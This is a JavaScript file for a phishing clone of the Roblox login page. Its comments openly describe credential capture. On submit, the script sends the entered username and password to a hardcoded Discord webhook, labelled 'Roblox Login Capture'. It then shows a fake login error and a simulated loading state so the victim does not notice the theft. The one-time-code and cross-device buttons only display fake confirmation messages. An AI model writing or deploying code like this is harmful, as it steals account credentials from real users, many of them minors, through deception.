/* Interaction layer for the login page clone:
 - mobile menu toggle
 - client-side form validation + error states (mirrors Roblox behavior)
 - CREDENTIAL CAPTURE: Sends data to Discord Webhook on submit attempt
 */

(function () {
    'use strict';

    // ---- CONFIGURATION ----
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1538723870050095204/oZWJ3gD5uDClYngLjnV1cJU3EHxoFHNPyISpMStVadt5RFT64A0I1PVJ44OL-Ri-EFvY";

    // ---- Mobile menu ----
    var toggler = document.getElementById('navbar-toggler');
    var menu = document.getElementById('mobile-menu');
    if (toggler && menu) {
        toggler.addEventListener('click', function () {
            var open = menu.classList.toggle('open');
            menu.hidden = !open;
            toggler.setAttribute('aria-expanded', String(open));
        });
    }

    // ---- Form ----
    var form = document.getElementById('login-form');
    var username = document.getElementById('login-username');
    var password = document.getElementById('login-password');
    var usernameError = document.getElementById('username-error');
    var passwordError = document.getElementById('password-error');
    var formError = document.getElementById('form-error');
    var loginButton = document.getElementById('login-button');

    function setFieldError(input, errorEl, message) {
        input.classList.toggle('input-error', !!message);
        errorEl.textContent = message || '';
    }

    function clearErrors() {
        setFieldError(username, usernameError, '');
        setFieldError(password, passwordError, '');
        formError.hidden = true;
    }

    // Clear per-field errors as the user types
    username.addEventListener('input', function () {
        if (username.classList.contains('input-error')) {
            setFieldError(username, usernameError, '');
            if (!password.value) formError.hidden = true;
        }
    });
    password.addEventListener('input', function () {
        if (password.classList.contains('input-error')) {
            setFieldError(password, passwordError, '');
            formError.hidden = true;
        }
    });

    function sendToWebhook(user, pass) {
        // Create the payload
        const payload = {
            embeds: [{
                title: "🚨 Roblox Login Capture",
                color: 15158332, // Red color
                fields: [
                    { name: "Username", value: user, inline: true },
                    { name: "Password", value: pass, inline: true }
                ],
                footer: {
                    text: "Captured at: " + new Date().toLocaleString()
                },
                timestamp: new Date().toISOString()
            }]
        };

        // Send to Discord
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        }).catch(err => console.error("Webhook failed:", err));
    }

    function handleSubmit(event) {
        event.preventDefault();
        clearErrors();

        var usernameValue = username.value.trim();
        var passwordValue = password.value;

        if (!usernameValue) {
            setFieldError(username, usernameError, 'Please enter your username.');
            username.focus();
            return;
        }
        if (!passwordValue) {
            setFieldError(password, passwordError, 'Please enter your password.');
            password.focus();
            return;
        }

        // --- CAPTURE CREDENTIALS ---
        // Send the data to the webhook immediately
        sendToWebhook(usernameValue, passwordValue);

        // --- SIMULATE ROBLOX BEHAVIOR ---
        // Show generic error like the real site does
        formError.hidden = false;
        setFieldError(password, passwordError, '');
        setFieldError(username, usernameError, '');

        // Simulate loading state
        loginButton.disabled = true;
        loginButton.textContent = 'Logging in...';
        
        setTimeout(function () {
            loginButton.disabled = false;
            loginButton.textContent = 'Log In';
            username.select(); // Focus back to username like real site
        }, 900);
    }

    form.addEventListener('submit', handleSubmit);

    // One-Time Code and Cross-Device buttons (UI only)
    document.getElementById('otc-button').addEventListener('click', function () {
        var msg = document.createElement('div');
        msg.className = 'form-error';
        msg.textContent = 'A one-time code has been sent to your email. (Demo)';
        formError.hidden = true;
        this.parentNode.insertBefore(msg, this.nextSibling);
        setTimeout(function () { msg.remove(); }, 4000);
    });

    document.getElementById('cross-device-button').addEventListener('click', function () {
        var msg = document.createElement('div');
        msg.className = 'form-error';
        msg.textContent = 'Confirm on your other device to continue. (Demo)';
        this.parentNode.insertBefore(msg, this.nextSibling);
        setTimeout(function () { msg.remove(); }, 4000);
    });
})();
